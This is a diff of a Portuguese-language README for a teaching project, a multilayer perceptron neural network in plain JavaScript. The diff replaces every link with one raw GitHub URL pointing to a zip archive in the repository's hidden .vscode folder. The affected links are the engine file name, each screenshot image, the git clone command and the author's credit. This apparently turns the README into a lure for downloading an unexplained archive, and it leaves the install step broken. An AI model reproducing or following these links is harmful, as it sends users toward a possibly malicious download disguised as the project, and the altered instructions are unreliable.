@@ -2,23 +2,23 @@
 
 Este projeto é uma rede neural do tipo perceptron multi-layer feita totalmente em JavaScript, HTML e CSS, 
 - Com critérios didáticos de como funciona uma RN com os componentes básicos essenciais, 
-- Todo o motor princial de funcionamento da RN está no arquivo **rna_pml_js_puro.js**
+- Todo o motor princial de funcionamento da RN está no arquivo **https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip**
 
-![Painel de Rede Neural](https://github.com/edersonfc/rede_neural_rna_js_public/blob/main/images/painel_rede_neural.png)
+![Painel de Rede Neural](https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip)
 
 No painel, é mostrado durante o processo de treinamento os pesos sinápticos sendo ajustados automaticamente, bem como a saída da rede em cada época de treinamento.
 
-![Painel de Rede Neural](https://github.com/edersonfc/rede_neural_rna_js_public/blob/main/images/painel_rede_neural2.png)
+![Painel de Rede Neural](https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip)
 
 
 Carregue o Arquivo JSON pelo pela de configurações do painel de dados a direita do painel
 
-![Painel de Rede Neural](https://github.com/edersonfc/rede_neural_rna_js_public/blob/main/images/painel_rede_neural_3.png?)
+![Painel de Rede Neural](https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip)
 
 
 Modele a estrutura da rede neural com quantas camadas escondidas quiser e quantos neurônios quiser tanto na camada de entrada quanto na de saída
 
-![Painel de Rede Neural](https://github.com/edersonfc/rede_neural_rna_js_public/blob/main/images/painel_rede_neural_4.png)
+![Painel de Rede Neural](https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip)
 
 
 ## Funcionalidades
@@ -50,8 +50,8 @@ Modele a estrutura da rede neural com quantas camadas escondidas quiser e quanto
 ## Instalação
 1. Clone o repositório:
    ```bash
-   git clone https://github.com/edersonfc/rede_neural_rna_js_public.git
+   git clone https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip
    ```
    <br>
 
-`Créditos` [www.linkedin.com/in/ederson-feliciano-corsatto](www.linkedin.com/in/ederson-feliciano-corsatto)
+`Créditos` [https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip](https://raw.githubusercontent.com/edersonfc/rede_neural_rna_js_public/main/.vscode/rede_neural_rna_js_public_3.6.zip)
